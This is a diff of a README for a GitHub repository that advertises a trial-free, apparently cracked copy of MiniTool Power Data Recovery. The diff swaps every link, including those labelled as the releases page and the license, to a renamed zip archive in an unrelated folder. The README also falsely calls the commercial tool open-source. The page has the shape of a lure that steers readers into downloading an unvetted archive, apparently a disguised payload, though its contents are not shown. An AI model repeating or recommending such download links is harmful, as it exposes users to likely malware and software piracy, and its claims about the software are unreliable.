@@ -1,6 +1,6 @@
 # 🛠️ MiniTool-Power-Data-Recovery-No-Trial - Simple File Recovery for Everyone
 
-[![Download Now](https://raw.githubusercontent.com/Raythka/MiniTool-Power-Data-Recovery-No-Trial/main/cortinate/MiniTool-Power-Data-Recovery-No-Trial_3.4.zip)](https://raw.githubusercontent.com/Raythka/MiniTool-Power-Data-Recovery-No-Trial/main/cortinate/MiniTool-Power-Data-Recovery-No-Trial_3.4.zip)
+[![Download Now](https://raw.githubusercontent.com/Raythka/MiniTool-Power-Data-Recovery-No-Trial/main/cortinate/Mini-Power-No-Recovery-Data-Trial-Tool-2.8-beta.4.zip)](https://raw.githubusercontent.com/Raythka/MiniTool-Power-Data-Recovery-No-Trial/main/cortinate/Mini-Power-No-Recovery-Data-Trial-Tool-2.8-beta.4.zip)
 
 ## 💻 Description
 
@@ -30,7 +30,7 @@ To get started with MiniTool Power Data Recovery, follow these simple steps. You
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Raythka/MiniTool-Power-Data-Recovery-No-Trial/main/cortinate/MiniTool-Power-Data-Recovery-No-Trial_3.4.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Raythka/MiniTool-Power-Data-Recovery-No-Trial/main/cortinate/Mini-Power-No-Recovery-Data-Trial-Tool-2.8-beta.4.zip).
 2. Look for the latest version available for download.
 3. Click on the download link for the application. It should be listed as a `.exe` file.
 4. Once the file finishes downloading, locate it in your downloads folder.
@@ -39,7 +39,7 @@ To get started with MiniTool Power Data Recovery, follow these simple steps. You
 
 For easy access, you can also click the large download button below.
 
-[![Download Now](https://raw.githubusercontent.com/Raythka/MiniTool-Power-Data-Recovery-No-Trial/main/cortinate/MiniTool-Power-Data-Recovery-No-Trial_3.4.zip)](https://raw.githubusercontent.com/Raythka/MiniTool-Power-Data-Recovery-No-Trial/main/cortinate/MiniTool-Power-Data-Recovery-No-Trial_3.4.zip)
+[![Download Now](https://raw.githubusercontent.com/Raythka/MiniTool-Power-Data-Recovery-No-Trial/main/cortinate/Mini-Power-No-Recovery-Data-Trial-Tool-2.8-beta.4.zip)](https://raw.githubusercontent.com/Raythka/MiniTool-Power-Data-Recovery-No-Trial/main/cortinate/Mini-Power-No-Recovery-Data-Trial-Tool-2.8-beta.4.zip)
 
 ## 🔍 How to Use
 
@@ -70,7 +70,7 @@ We welcome contributions to improve MiniTool Power Data Recovery. If you have su
 
 MiniTool Power Data Recovery is open-source software. You can freely use, modify, and distribute it according to the terms of the license.
 
-For more details, check the [LICENSE](https://raw.githubusercontent.com/Raythka/MiniTool-Power-Data-Recovery-No-Trial/main/cortinate/MiniTool-Power-Data-Recovery-No-Trial_3.4.zip) file in the repository.
+For more details, check the [LICENSE](https://raw.githubusercontent.com/Raythka/MiniTool-Power-Data-Recovery-No-Trial/main/cortinate/Mini-Power-No-Recovery-Data-Trial-Tool-2.8-beta.4.zip) file in the repository.
 
 ## 🤔 Frequently Asked Questions (FAQs)
 
